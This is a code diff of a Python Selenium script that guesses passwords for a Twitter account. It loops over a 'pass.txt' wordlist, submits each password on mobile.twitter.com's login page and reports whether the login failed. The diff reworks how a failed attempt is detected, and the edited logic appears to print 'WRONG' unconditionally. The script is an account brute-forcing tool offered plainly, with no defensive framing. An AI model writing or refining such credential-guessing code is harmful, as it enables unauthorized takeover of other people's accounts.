@@ -19,13 +19,14 @@ def main(password):
     driver.find_element_by_name('session[password]').send_keys(Keys.RETURN);
 
     wait = WebDriverWait(driver, 10)
-    wait.until(EC.url_changes('https://current_page.com'))
+    wait.until(EC.url_changes('http://mobile.twitter.com/login'))
 
-    if "did not match our records" in driver.page_source:
-        print("%s -------- WRONG", password)
-    else:
-        print("%s -------- FOUND??", password)
-        exit(1)
+    waitForLoad = WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.XPATH, "//div[@role='alert']"))
+    )
+
+    return print(f"{password} -------- WRONG")
+
 
 
 with open("pass.txt", "r") as list:
